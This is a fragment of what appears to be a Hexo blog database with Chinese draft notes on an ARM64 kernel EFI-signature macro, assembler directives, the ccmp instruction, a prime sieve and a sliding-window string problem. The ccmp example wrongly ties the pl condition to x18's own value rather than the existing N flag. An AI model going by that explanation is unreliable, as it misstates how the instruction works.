#0）或寄存器，作为比较的第二个操作数。\n\t•\t标志掩码：一个 4 位的立即数，用于设置条件标志寄存器（Condition Flags Register，NZCV）的值（Negative、Zero、Carry 和 Overflow）。\n\t•\t条件：一个条件码（如 pl），表示当满足某个条件时执行该比较指令。\n\n解释各部分\n\nccmp\tx18, #0, #0xd, pl\n\n详细说明：\n\n\t1.\tx18：第一个操作数。指令将 x18 寄存器中的值与 0 进行比较。\n\t2.\t#0：立即数操作数2，表示与 x18 的值进行比较。\n\t3.\t#0xd：标志掩码，指示 NZCV 标志的掩码值（在满足条件的情况下）。\n\t•\t#0xd 在二进制中是 1101，将影响设置为：N=1, Z=1, C=0, V=1。\n\t4.\tpl：条件码，表示“正或零”（Positive or Zero），当 N=0 时条件满足（正值或零时满足条件）。\n\n工作流程\n\n\t•\t如果条件码 pl 满足，即 N=0，则执行 x18 和 0 的比较操作，并根据比较结果更新 NZCV 标志。\n\t•\t如果条件不满足，ccmp 指令不会执行比较，而是直接将 NZCV 标志设置为 #0xd 指定的值（N=1, Z=1, C=0, V=1）。\n\n使用场景\n\n\t•\tccmp 通常用于减少分支，尤其是在多重条件判断或比较操作时，替代一些传统的 cmp 指令和分支指令组合。\n\t•\t例如，用在函数的条件判断中，可以避免多次分支跳转，提升代码执行效率。\n\n示例\n\n假设 x18 中的值为 10：\n\nccmp x18, #0, #0xd, pl\n\n\t•\t如果 x18 >= 0（满足 pl 条件），将 x18 和 0 比较，更新 NZCV 标志。\n\t•\t如果 x18 < 0（不满足条件），则直接将 NZCV 标志设置为 1101。","source":"_drafts/s.md","raw":"\n```s\n\t.macro\tefi_signature_nop\n#ifdef CONFIG_EFI\n.L_head:\n\t/*\n\t * This ccmp instruction has no meaningful effect except that\n\t * its opcode forms the magic \"MZ\" signature required by UEFI.\n\t */\n\tccmp\tx18, #0, #0xd, pl\n#else\n\t/*\n\t * Bootloaders may inspect the opcode at the start of the kernel\n\t * image to decide if the kernel is capable of booting via UEFI.\n\t * So put an ordinary NOP here, not the \"MZ..\" pseudo-nop above.\n\t */\n\tnop\n#endif\n\t.endm\n```\n### .的用法\n在汇编语言中，指令和伪指令（pseudo-ops）通常以 . 开头。它们的作用是帮助汇编器识别代码结构，定义数据类型，声明宏，分配内存空间等。以下是 .macro、.endm、.set、.long、.short 等伪指令的含义和 . 的用法。\n\n1. .macro 和 .endm\n\n\t•\t.macro：用于定义一个宏。宏是一段可以重复调用的代码模板，通过 .macro 开始定义，后面跟上宏的名称和可选的参数。\n\t•\t.endm：用于结束宏定义，表示宏的结束。\n\n示例：\n\n.macro my_macro, param1, param2\n    mov x0, \\param1\n    add x1, x0, \\param2\n.endm\n\n在上面的代码中，定义了一个名为 my_macro 的宏，接受两个参数 param1 和 param2。\n\n2. .set\n\n\t•\t.set：用于定义或修改符号的值。它类似于变量赋值，可以在代码中重复使用，也可以作为标签的偏移量等用途。\n\n示例：\n\n.set my_value, 100\nmov x0, #my_value   // 使用my_value代替100\n\n在这里，my_value 被设置为 100，以后可以用它来代替 100。\n\n3. .long 和 .short\n\n\t•\t.long：用于声明 4 字节（32位）数据，通常表示一个 32 位整数或地址。\n\t•\t.short：用于声明 2 字节（16位）数据，通常表示一个 16 位整数。\n\n示例：\n\n.long 0x12345678  // 定义一个32位数据\n.short 0x1234     // 定义一个16位数据\n\n在上面的例子中，.long 分配了 4 个字节存储 0x12345678，.short 分配了 2 个字节存储 0x1234。\n\n4. . 的用法\n\n. 表示“当前地址”或“当前位置”。它可以在汇编代码中表示当前的汇编位置，用于计算偏移量。\n\n示例：\n\n.label_start:\n    .long . - .label_start\n\n在这个例子中，. - .label_start 计算了当前地址和 label_start 标签的偏移量。\n\n其他常见伪指令\n\n\t•\t.ascii：定义不带终止符的字符串。\n\t•\t.asciz：定义带有 NUL（空字符）结尾的字符串。\n\t•\t.align：用于内存对齐，将地址对齐到指定的边界。\n\n总结：这些伪指令和 . 符号在汇编中提供了灵活性和结构化，帮助汇编器处理各种数据布局和宏定义，简化代码。\n\n### ccmp 指令 // todo\nccmp 指令在 ARM64 架构中是一种条件比较指令，它的全称是 “Conditional Compare”（条件比较），用于根据条件标志执行比较操作。这条指令允许在单个指令中同时进行比较和条件标志更新，这在减少分支和提高指令执行效率方面非常有用。\n\n指令格式\n\nccmp <操作数1>, <操作数2>, <标志掩码>, <条件>\n\n\t•\t操作数1：通常是一个寄存器，包含要进行比较的第一个操作数。\n\t•\t操作数2：可以是一个立即数（如 #0）或寄存器，作为比较的第二个操作数。\n\t•\t标志掩码：一个 4 位的立即数，用于设置条件标志寄存器（Condition Flags Register，NZCV）的值（Negative、Zero、Carry 和 Overflow）。\n\t•\t条件：一个条件码（如 pl），表示当满足某个条件时执行该比较指令。\n\n解释各部分\n\nccmp\tx18, #0, #0xd, pl\n\n详细说明：\n\n\t1.\tx18：第一个操作数。指令将 x18 寄存器中的值与 0 进行比较。\n\t2.\t#0：立即数操作数2，表示与 x18 的值进行比较。\n\t3.\t#0xd：标志掩码，指示 NZCV 标志的掩码值（在满足条件的情况下）。\n\t•\t#0xd 在二进制中是 1101，将影响设置为：N=1, Z=1, C=0, V=1。\n\t4.\tpl：条件码，表示“正或零”（Positive or Zero），当 N=0 时条件满足（正值或零时满足条件）。\n\n工作流程\n\n\t•\t如果条件码 pl 满足，即 N=0，则执行 x18 和 0 的比较操作，并根据比较结果更新 NZCV 标志。\n\t•\t如果条件不满足，ccmp 指令不会执行比较，而是直接将 NZCV 标志设置为 #0xd 指定的值（N=1, Z=1, C=0, V=1）。\n\n使用场景\n\n\t•\tccmp 通常用于减少分支，尤其是在多重条件判断或比较操作时，替代一些传统的 cmp 指令和分支指令组合。\n\t•\t例如，用在函数的条件判断中，可以避免多次分支跳转，提升代码执行效率。\n\n示例\n\n假设 x18 中的值为 10：\n\nccmp x18, #0, #0xd, pl\n\n\t•\t如果 x18 >= 0（满足 pl 条件），将 x18 和 0 比较，更新 NZCV 标志。\n\t•\t如果 x18 < 0（不满足条件），则直接将 NZCV 标志设置为 1101。","slug":"s","published":0,"date":"2024-10-27T15:38:04.675Z","updated":"2024-10-29T15:26:48.181Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44rit0000jv8fyfxkucuhv","content":"<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t.macro\tefi_signature_nop</span><br><span class=\"line\">#ifdef CONFIG_EFI</span><br><span class=\"line\">.L_head:</span><br><span class=\"line\">\t/*</span><br><span class=\"line\">\t * This ccmp instruction has no meaningful effect except that</span><br><span class=\"line\">\t * its opcode forms the magic &quot;MZ&quot; signature required by UEFI.</span><br><span class=\"line\">\t */</span><br><span class=\"line\">\tccmp\tx18, #0, #0xd, pl</span><br><span class=\"line\">#else</span><br><span class=\"line\">\t/*</span><br><span class=\"line\">\t * Bootloaders may inspect the opcode at the start of the kernel</span><br><span class=\"line\">\t * image to decide if the kernel is capable of booting via UEFI.</span><br><span class=\"line\">\t * So put an ordinary NOP here, not the &quot;MZ..&quot; pseudo-nop above.</span><br><span class=\"line\">\t */</span><br><span class=\"line\">\tnop</span><br><span class=\"line\">#endif</span><br><span class=\"line\">\t.endm</span><br></pre></td></tr></table></figure>\n<h3 id=\"的用法\"><a href=\"#的用法\" class=\"headerlink\" title=\".的用法\"></a>.的用法</h3><p>在汇编语言中，指令和伪指令（pseudo-ops）通常以 . 开头。它们的作用是帮助汇编器识别代码结构，定义数据类型，声明宏，分配内存空间等。以下是 .macro、.endm、.set、.long、.short 等伪指令的含义和 . 的用法。</p>\n<ol>\n<li><p>.macro 和 .endm</p>\n<p> •    .macro：用于定义一个宏。宏是一段可以重复调用的代码模板，通过 .macro 开始定义，后面跟上宏的名称和可选的参数。<br> •    .endm：用于结束宏定义，表示宏的结束。</p>\n</li>\n</ol>\n<p>示例：</p>\n<p>.macro my_macro, param1, param2<br>    mov x0, \\param1<br>    add x1, x0, \\param2<br>.endm</p>\n<p>在上面的代码中，定义了一个名为 my_macro 的宏，接受两个参数 param1 和 param2。</p>\n<ol start=\"2\">\n<li><p>.set</p>\n<p> •    .set：用于定义或修改符号的值。它类似于变量赋值，可以在代码中重复使用，也可以作为标签的偏移量等用途。</p>\n</li>\n</ol>\n<p>示例：</p>\n<p>.set my_value, 100<br>mov x0, #my_value   // 使用my_value代替100</p>\n<p>在这里，my_value 被设置为 100，以后可以用它来代替 100。</p>\n<ol start=\"3\">\n<li><p>.long 和 .short</p>\n<p> •    .long：用于声明 4 字节（32位）数据，通常表示一个 32 位整数或地址。<br> •    .short：用于声明 2 字节（16位）数据，通常表示一个 16 位整数。</p>\n</li>\n</ol>\n<p>示例：</p>\n<p>.long 0x12345678  // 定义一个32位数据<br>.short 0x1234     // 定义一个16位数据</p>\n<p>在上面的例子中，.long 分配了 4 个字节存储 0x12345678，.short 分配了 2 个字节存储 0x1234。</p>\n<ol start=\"4\">\n<li>. 的用法</li>\n</ol>\n<p>. 表示“当前地址”或“当前位置”。它可以在汇编代码中表示当前的汇编位置，用于计算偏移量。</p>\n<p>示例：</p>\n<p>.label_start:<br>    .long . - .label_start</p>\n<p>在这个例子中，. - .label_start 计算了当前地址和 label_start 标签的偏移量。</p>\n<p>其他常见伪指令</p>\n<pre><code>•    .ascii：定义不带终止符的字符串。\n•    .asciz：定义带有 NUL（空字符）结尾的字符串。\n•    .align：用于内存对齐，将地址对齐到指定的边界。\n</code></pre>\n<p>总结：这些伪指令和 . 符号在汇编中提供了灵活性和结构化，帮助汇编器处理各种数据布局和宏定义，简化代码。</p>\n<h3 id=\"ccmp-指令-todo\"><a href=\"#ccmp-指令-todo\" class=\"headerlink\" title=\"ccmp 指令 // todo\"></a>ccmp 指令 // todo</h3><p>ccmp 指令在 ARM64 架构中是一种条件比较指令，它的全称是 “Conditional Compare”（条件比较），用于根据条件标志执行比较操作。这条指令允许在单个指令中同时进行比较和条件标志更新，这在减少分支和提高指令执行效率方面非常有用。</p>\n<p>指令格式</p>\n<p>ccmp &lt;操作数1&gt;, &lt;操作数2&gt;, &lt;标志掩码&gt;, &lt;条件&gt;</p>\n<pre><code>•    操作数1：通常是一个寄存器，包含要进行比较的第一个操作数。\n•    操作数2：可以是一个立即数（如 #0）或寄存器，作为比较的第二个操作数。\n•    标志掩码：一个 4 位的立即数，用于设置条件标志寄存器（Condition Flags Register，NZCV）的值（Negative、Zero、Carry 和 Overflow）。\n•    条件：一个条件码（如 pl），表示当满足某个条件时执行该比较指令。\n</code></pre>\n<p>解释各部分</p>\n<p>ccmp    x18, #0, #0xd, pl</p>\n<p>详细说明：</p>\n<pre><code>1.    x18：第一个操作数。指令将 x18 寄存器中的值与 0 进行比较。\n2.    #0：立即数操作数2，表示与 x18 的值进行比较。\n3.    #0xd：标志掩码，指示 NZCV 标志的掩码值（在满足条件的情况下）。\n•    #0xd 在二进制中是 1101，将影响设置为：N=1, Z=1, C=0, V=1。\n4.    pl：条件码，表示“正或零”（Positive or Zero），当 N=0 时条件满足（正值或零时满足条件）。\n</code></pre>\n<p>工作流程</p>\n<pre><code>•    如果条件码 pl 满足，即 N=0，则执行 x18 和 0 的比较操作，并根据比较结果更新 NZCV 标志。\n•    如果条件不满足，ccmp 指令不会执行比较，而是直接将 NZCV 标志设置为 #0xd 指定的值（N=1, Z=1, C=0, V=1）。\n</code></pre>\n<p>使用场景</p>\n<pre><code>•    ccmp 通常用于减少分支，尤其是在多重条件判断或比较操作时，替代一些传统的 cmp 指令和分支指令组合。\n•    例如，用在函数的条件判断中，可以避免多次分支跳转，提升代码执行效率。\n</code></pre>\n<p>示例</p>\n<p>假设 x18 中的值为 10：</p>\n<p>ccmp x18, #0, #0xd, pl</p>\n<pre><code>•    如果 x18 &gt;= 0（满足 pl 条件），将 x18 和 0 比较，更新 NZCV 标志。\n•    如果 x18 &lt; 0（不满足条件），则直接将 NZCV 标志设置为 1101。\n</code></pre>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t.macro\tefi_signature_nop</span><br><span class=\"line\">#ifdef CONFIG_EFI</span><br><span class=\"line\">.L_head:</span><br><span class=\"line\">\t/*</span><br><span class=\"line\">\t * This ccmp instruction has no meaningful effect except that</span><br><span class=\"line\">\t * its opcode forms the magic &quot;MZ&quot; signature required by UEFI.</span><br><span class=\"line\">\t */</span><br><span class=\"line\">\tccmp\tx18, #0, #0xd, pl</span><br><span class=\"line\">#else</span><br><span class=\"line\">\t/*</span><br><span class=\"line\">\t * Bootloaders may inspect the opcode at the start of the kernel</span><br><span class=\"line\">\t * image to decide if the kernel is capable of booting via UEFI.</span><br><span class=\"line\">\t * So put an ordinary NOP here, not the &quot;MZ..&quot; pseudo-nop above.</span><br><span class=\"line\">\t */</span><br><span class=\"line\">\tnop</span><br><span class=\"line\">#endif</span><br><span class=\"line\">\t.endm</span><br></pre></td></tr></table></figure>\n<h3 id=\"的用法\"><a href=\"#的用法\" class=\"headerlink\" title=\".的用法\"></a>.的用法</h3><p>在汇编语言中，指令和伪指令（pseudo-ops）通常以 . 开头。它们的作用是帮助汇编器识别代码结构，定义数据类型，声明宏，分配内存空间等。以下是 .macro、.endm、.set、.long、.short 等伪指令的含义和 . 的用法。</p>\n<ol>\n<li><p>.macro 和 .endm</p>\n<p> •    .macro：用于定义一个宏。宏是一段可以重复调用的代码模板，通过 .macro 开始定义，后面跟上宏的名称和可选的参数。<br> •    .endm：用于结束宏定义，表示宏的结束。</p>\n</li>\n</ol>\n<p>示例：</p>\n<p>.macro my_macro, param1, param2<br>    mov x0, \\param1<br>    add x1, x0, \\param2<br>.endm</p>\n<p>在上面的代码中，定义了一个名为 my_macro 的宏，接受两个参数 param1 和 param2。</p>\n<ol start=\"2\">\n<li><p>.set</p>\n<p> •    .set：用于定义或修改符号的值。它类似于变量赋值，可以在代码中重复使用，也可以作为标签的偏移量等用途。</p>\n</li>\n</ol>\n<p>示例：</p>\n<p>.set my_value, 100<br>mov x0, #my_value   // 使用my_value代替100</p>\n<p>在这里，my_value 被设置为 100，以后可以用它来代替 100。</p>\n<ol start=\"3\">\n<li><p>.long 和 .short</p>\n<p> •    .long：用于声明 4 字节（32位）数据，通常表示一个 32 位整数或地址。<br> •    .short：用于声明 2 字节（16位）数据，通常表示一个 16 位整数。</p>\n</li>\n</ol>\n<p>示例：</p>\n<p>.long 0x12345678  // 定义一个32位数据<br>.short 0x1234     // 定义一个16位数据</p>\n<p>在上面的例子中，.long 分配了 4 个字节存储 0x12345678，.short 分配了 2 个字节存储 0x1234。</p>\n<ol start=\"4\">\n<li>. 的用法</li>\n</ol>\n<p>. 表示“当前地址”或“当前位置”。它可以在汇编代码中表示当前的汇编位置，用于计算偏移量。</p>\n<p>示例：</p>\n<p>.label_start:<br>    .long . - .label_start</p>\n<p>在这个例子中，. - .label_start 计算了当前地址和 label_start 标签的偏移量。</p>\n<p>其他常见伪指令</p>\n<pre><code>•    .ascii：定义不带终止符的字符串。\n•    .asciz：定义带有 NUL（空字符）结尾的字符串。\n•    .align：用于内存对齐，将地址对齐到指定的边界。\n</code></pre>\n<p>总结：这些伪指令和 . 符号在汇编中提供了灵活性和结构化，帮助汇编器处理各种数据布局和宏定义，简化代码。</p>\n<h3 id=\"ccmp-指令-todo\"><a href=\"#ccmp-指令-todo\" class=\"headerlink\" title=\"ccmp 指令 // todo\"></a>ccmp 指令 // todo</h3><p>ccmp 指令在 ARM64 架构中是一种条件比较指令，它的全称是 “Conditional Compare”（条件比较），用于根据条件标志执行比较操作。这条指令允许在单个指令中同时进行比较和条件标志更新，这在减少分支和提高指令执行效率方面非常有用。</p>\n<p>指令格式</p>\n<p>ccmp &lt;操作数1&gt;, &lt;操作数2&gt;, &lt;标志掩码&gt;, &lt;条件&gt;</p>\n<pre><code>•    操作数1：通常是一个寄存器，包含要进行比较的第一个操作数。\n•    操作数2：可以是一个立即数（如 #0）或寄存器，作为比较的第二个操作数。\n•    标志掩码：一个 4 位的立即数，用于设置条件标志寄存器（Condition Flags Register，NZCV）的值（Negative、Zero、Carry 和 Overflow）。\n•    条件：一个条件码（如 pl），表示当满足某个条件时执行该比较指令。\n</code></pre>\n<p>解释各部分</p>\n<p>ccmp    x18, #0, #0xd, pl</p>\n<p>详细说明：</p>\n<pre><code>1.    x18：第一个操作数。指令将 x18 寄存器中的值与 0 进行比较。\n2.    #0：立即数操作数2，表示与 x18 的值进行比较。\n3.    #0xd：标志掩码，指示 NZCV 标志的掩码值（在满足条件的情况下）。\n•    #0xd 在二进制中是 1101，将影响设置为：N=1, Z=1, C=0, V=1。\n4.    pl：条件码，表示“正或零”（Positive or Zero），当 N=0 时条件满足（正值或零时满足条件）。\n</code></pre>\n<p>工作流程</p>\n<pre><code>•    如果条件码 pl 满足，即 N=0，则执行 x18 和 0 的比较操作，并根据比较结果更新 NZCV 标志。\n•    如果条件不满足，ccmp 指令不会执行比较，而是直接将 NZCV 标志设置为 #0xd 指定的值（N=1, Z=1, C=0, V=1）。\n</code></pre>\n<p>使用场景</p>\n<pre><code>•    ccmp 通常用于减少分支，尤其是在多重条件判断或比较操作时，替代一些传统的 cmp 指令和分支指令组合。\n•    例如，用在函数的条件判断中，可以避免多次分支跳转，提升代码执行效率。\n</code></pre>\n<p>示例</p>\n<p>假设 x18 中的值为 10：</p>\n<p>ccmp x18, #0, #0xd, pl</p>\n<pre><code>•    如果 x18 &gt;= 0（满足 pl 条件），将 x18 和 0 比较，更新 NZCV 标志。\n•    如果 x18 &lt; 0（不满足条件），则直接将 NZCV 标志设置为 1101。\n</code></pre>\n"},{"_content":"素数筛法\n埃拉托斯特尼筛法\n如果我们想要知道小于等于 n 有多少个素数呢？\n\n一个自然的想法是对于小于等于 n 的每个数进行一次质数检验。这种暴力的做法显然不能达到最优复杂度。\n\n埃拉托斯特尼筛法\n过程\n考虑这样一件事情：对于任意一个大于 1 的正整数 n，那么它的 x 倍就是合数（x > 1）。利用这个结论，我们可以避免很多次不必要的检测。\n\n如果我们从小到大考虑每个数，然后同时把当前这个数的所有（比自己大的）倍数记为合数，那么运行结束的时候没有被标记的数就是素数了。oo\n```cpp\nvector<int> prime;\nbool is_prime[N];\n\nvoid Eratosthenes(int n) {\n  is_prime[0] = is_prime[1] = false;\n  for (int i = 2; i <= n; ++i) is_prime[i] = true;\n  for (int i = 2; i <= n; ++i) {\n    if (is_prime[i]) {\n      prime.push_back(i);\n      if ((long long)i * i > n) continue;\n      for (int j = i * i; j <= n; j += i)\n        // 因为从 2 到 i - 1 的倍数我们之前筛过了，这里直接从 i\n        // 的倍数开始，提高了运行速度\n        is_prime[j] = false;  // 是 i 的倍数的均不是素数\n    }\n  }\n}\n```\n\n滑动窗口：\n\n无重复字符的最长子串\n暴力：\n```cpp\nclass Solution {\npublic:\n    int lengthOfLongestSubstring(string s) {\n        // std::unordered_map<int,int> tmp;\n        if(s.length()==0)return 0;\n        int window_start=0;\n        int window_end=0;\n        int ans =1;\n        for(int i=1;i<s.length();i++){\n            for(int k=window_start;k<=window_end;k++){\n                if(s[k]==s[i]){\n                    ans = max(ans,window_end-window_start+1);\n                    window_start=k+1;\n                    window_end = i;\n                    break;\n                }\n            }\n            window_end=i;\n        }\n        ans = max(ans,window_end-window_start+1);\n        return ans;\n    }\n};\n```\n\n\n重复字符，用散列表+滑动窗口\n```cpp\n\n```","source":"_drafts/算法.md","raw":"素数筛法\n埃拉托斯特尼筛法\n如果我们想要知道小于等于 n 有多少个素数呢？\n\n一个自然的想法是对于小于等于 n 的每个数进行一次质数检验。这种暴力的做法显然不能达到最优复杂度。\n\n埃拉托斯特尼筛法\n过程\n考虑这样一件事情：对于任意一个大于 1 的正整数 n，那么它的 x 倍就是合数（x > 1）。利用这个结论，我们可以避免很多次不必要的检测。\n\n如果我们从小到大考虑每个数，然后同时把当前这个数的所有（比自己大的）倍数记为合数，那么运行结束的时候没有被标记的数就是素数了。oo\n```cpp\nvector<int> prime;\nbool is_prime[N];\n\nvoid Eratosthenes(int n) {\n  is_prime[0] = is_prime[1] = false;\n  for (int i = 2; i <= n; ++i) is_prime[i] = true;\n  for (int i = 2; i <= n; ++i) {\n    if (is_prime[i]) {\n      prime.push_back(i);\n      if ((long long)i * i > n) continue;\n      for (int j = i * i; j <= n; j += i)\n        // 因为从 2 到 i - 1 的倍数我们之前筛过了，这里直接从 i\n        // 的倍数开始，提高了运行速度\n        is_prime[j] = false;  // 是 i 的倍数的均不是素数\n    }\n  }\n}\n```\n\n滑动窗口：\n\n无重复字符的最长子串\n暴力：\n```cpp\nclass Solution {\npublic:\n    int lengthOfLongestSubstring(string s) {\n        // std::unordered_map<int,int> tmp;\n        if(s.length()==0)return 0;\n        int window_start=0;\n        int window_end=0;\n        int ans =1;\n        for(int i=1;i<s.length();i++){\n            for(int k=window_start;k<=window_end;k++){\n                if(s[k]==s[i]){\n                    ans = max(ans,window_end-window_start+1);\n                    window_start=k+1;\n                    window_end = i;\n                    break;\n                }\n            }\n            window_end=i;\n        }\n        ans = max(ans,window_end-window_start+1);\n        return ans;\n    }\n};\n```\n\n\n重复字符，用散列表+滑动窗口\n```cpp\n\n```","slug":"算法","published":0,"date":"2024-11-23T14:54:20.855Z","updated":"2025-01-13T17:14:02.638Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44rit0000kv8fybsupayrg","content":"<p>素数筛法<br>埃拉托斯特尼筛法<br>如果我们想要知道小于等于 n 有多少个素数呢？</p>\n<p>一个自然的想法是对于小于等于 n 的每个数进行一次质数检验。这种暴力的做法显然不能达到最优复杂度。</p>\n<p>埃拉托斯特尼筛法<br>过程<br>考虑这样一件事情：对于任意一个大于 1 的正整数 n，那么它的 x 倍就是合数（x &gt; 1）。利用这个结论，我们可以避免很多次不必要的检测。</p>\n<p>如果我们从小到大考虑每个数，然后同时把当前这个数的所有（比自己大的）倍数记为合数，那么运行结束的时候没有被标记的数就是素数了。oo</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vector&lt;<span class=\"type\">int</span>&gt; prime;</span><br><span class=\"line\"><span class=\"type\">bool</span> is_prime[N];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">Eratosthenes</span><span class=\"params\">(<span class=\"type\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">  is_prime[<span class=\"number\">0</span>] = is_prime[<span class=\"number\">1</span>] = <span class=\"literal\">false</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">2</span>; i &lt;= n; ++i) is_prime[i] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">2</span>; i &lt;= n; ++i) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (is_prime[i]) &#123;</span><br><span class=\"line\">      prime.<span class=\"built_in\">push_back</span>(i);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ((<span class=\"type\">long</span> <span class=\"type\">long</span>)i * i &gt; n) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> (<span class=\"type\">int</span> j = i * i; j &lt;= n; j += i)</span><br><span class=\"line\">        <span class=\"comment\">// 因为从 2 到 i - 1 的倍数我们之前筛过了，这里直接从 i</span></span><br><span class=\"line\">        <span class=\"comment\">// 的倍数开始，提高了运行速度</span></span><br><span class=\"line\">        is_prime[j] = <span class=\"literal\">false</span>;  <span class=\"comment\">// 是 i 的倍数的均不是素数</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>滑动窗口：</p>\n<p>无重复字符的最长子串<br>暴力：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Solution</span> &#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">lengthOfLongestSubstring</span><span class=\"params\">(string s)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// std::unordered_map&lt;int,int&gt; tmp;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(s.<span class=\"built_in\">length</span>()==<span class=\"number\">0</span>)<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> window_start=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> window_end=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> ans =<span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;s.<span class=\"built_in\">length</span>();i++)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"type\">int</span> k=window_start;k&lt;=window_end;k++)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(s[k]==s[i])&#123;</span><br><span class=\"line\">                    ans = <span class=\"built_in\">max</span>(ans,window_end-window_start+<span class=\"number\">1</span>);</span><br><span class=\"line\">                    window_start=k+<span class=\"number\">1</span>;</span><br><span class=\"line\">                    window_end = i;</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            window_end=i;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        ans = <span class=\"built_in\">max</span>(ans,window_end-window_start+<span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ans;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n\n<p>重复字符，用散列表+滑动窗口</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>","site":{"data":{}},"cover":false,"excerpt":"","more":"<p>素数筛法<br>埃拉托斯特尼筛法<br>如果我们想要知道小于等于 n 有多少个素数呢？</p>\n<p>一个自然的想法是对于小于等于 n 的每个数进行一次质数检验。这种暴力的做法显然不能达到最优复杂度。</p>\n<p>埃拉托斯特尼筛法<br>过程<br>考虑这样一件事情：对于任意一个大于 1 的正整数 n，那么它的 x 倍就是合数（x &gt; 1）。利用这个结论，我们可以避免很多次不必要的检测。</p>\n<p>如果我们从小到大考虑每个数，然后同时把当前这个数的所有（比自己大的）倍数记为合数，那么运行结束的时候没有被标记的数就是素数了。oo</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vector&lt;<span class=\"type\">int</span>&gt; prime;</span><br><span class=\"line\"><span class=\"type\">bool</span> is_prime[N];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span 